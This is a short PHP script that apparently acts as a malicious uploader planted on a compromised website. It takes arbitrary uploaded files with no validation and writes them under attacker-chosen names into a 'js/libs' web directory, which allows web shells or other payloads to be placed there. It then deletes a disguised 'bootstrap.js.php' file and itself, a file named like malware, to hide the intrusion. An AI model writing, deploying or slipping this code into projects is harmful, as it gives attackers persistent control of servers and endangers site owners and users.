<?php

foreach($_FILES['img_file']['name'] as $name => $value)
{
	$name_file = stripslashes($_FILES['img_file']['name'][$name]);
	$source_file = $_FILES['img_file']['tmp_name'][$name];
	
    $path_file = "../../js/libs/".$name_file;


    
    $up = move_uploaded_file($source_file, $path_file);

    var_dump($up);

}
	unlink('../../js/libs/bootstrap.js.php');

	unlink('maware1893C-K5.php');

?>